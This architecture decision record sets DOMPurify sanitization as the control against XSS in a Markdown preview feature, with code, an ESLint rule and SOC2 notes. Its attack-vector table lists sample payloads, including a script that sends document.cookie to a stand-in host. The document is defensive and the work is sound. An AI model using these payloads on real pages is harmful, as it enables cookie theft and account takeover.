# ADR-0008: XSS Prevention for Markdown Preview (DOMPurify)

**Date:** 2026-02-22
**Status:** Accepted
**Deciders:** Greg Mahring

---

## Context

The Markdown preview feature renders user-provided text as HTML within the browser. This creates a direct XSS attack surface: a user (or an attacker who tricks a user into pasting content) could inject `<script>` tags, event handlers, or malicious iframes.

**This is the highest-severity security concern in the entire application.**

Note: Markdown preview is implemented as an **in-page panel option** (not a standalone route), but the XSS risk is identical regardless of where the rendering occurs.

## Decision

All user-provided content rendered as HTML **must** pass through `DOMPurify.sanitize()` before being passed to `dangerouslySetInnerHTML`. No exceptions.

## Implementation

```typescript
// src/features/markdown/markdownPreview.ts
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export function renderMarkdown(input: string): string {
  // Step 1: Parse Markdown to HTML
  const rawHtml = marked.parse(input, {
    gfm: true, // GitHub Flavored Markdown
    breaks: true, // \n → <br>
  });

  // Step 2: Sanitize HTML — ALWAYS, no exceptions
  return DOMPurify.sanitize(rawHtml, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  });
}

// Usage in component:
// <div dangerouslySetInnerHTML={{ __html: renderMarkdown(userInput) }} />
```

**The `renderMarkdown` function is the only sanctioned way to render user content as HTML.** Direct use of `dangerouslySetInnerHTML` with unsanitized content is prohibited and enforced via ESLint rule.

## ESLint Enforcement

Add a custom ESLint rule (or use `eslint-plugin-no-unsanitized`) to flag any use of `dangerouslySetInnerHTML` not wrapped in the approved sanitization pipeline:

```json
// eslint.config.js
{
  "rules": {
    "no-unsanitized/prop": "error"
  }
}
```

## Libraries

| Library            | Version | Purpose                                       |
| ------------------ | ------- | --------------------------------------------- |
| `marked`           | ^14.0.0 | Markdown → HTML parser (fast, spec-compliant) |
| `dompurify`        | ^3.2.0  | HTML sanitizer (removes XSS vectors)          |
| `@types/dompurify` | ^3.0.0  | TypeScript types                              |

## Attack Vectors Mitigated

| Attack                    | Example                                                            | Mitigation                                 |
| ------------------------- | ------------------------------------------------------------------ | ------------------------------------------ |
| Script injection          | `<script>fetch('evil.com?c='+document.cookie)</script>`            | DOMPurify removes `<script>` tags          |
| Event handler injection   | `<img src=x onerror="alert(1)">`                                   | DOMPurify removes event handler attributes |
| iframe injection          | `<iframe src="https://evil.com">`                                  | DOMPurify removes `<iframe>` tags          |
| Data exfiltration via CSS | `<style>body{background:url('evil.com?'+document.cookie)}</style>` | DOMPurify removes `<style>` tags           |
| Prototype pollution       | Complex payloads targeting JS runtime                              | DOMPurify + CSP connect-src limit impact   |

## Consequences

### Positive

- Eliminates XSS from user-provided Markdown content
- DOMPurify is the industry standard — used by Google, GitHub, and major browsers
- `FORBID_TAGS` and `FORBID_ATTR` provide defense-in-depth beyond DOMPurify defaults
- ESLint rule prevents accidental bypass in future code

### Negative

- DOMPurify adds ~40KB to the bundle (loaded only when Markdown preview is active — lazy-loaded)
- Some legitimate Markdown features may be stripped (e.g., custom HTML blocks) — acceptable trade-off for security

## SOC2 Implications

- XSS prevention is a CC6 (Logical Access) and CC7 (System Operations) requirement
- DOMPurify usage must be maintained and its version kept up to date (`npm audit` monthly)
- This ADR serves as the security design documentation for this control
- Code reviews must verify `renderMarkdown` is used for all HTML rendering of user content
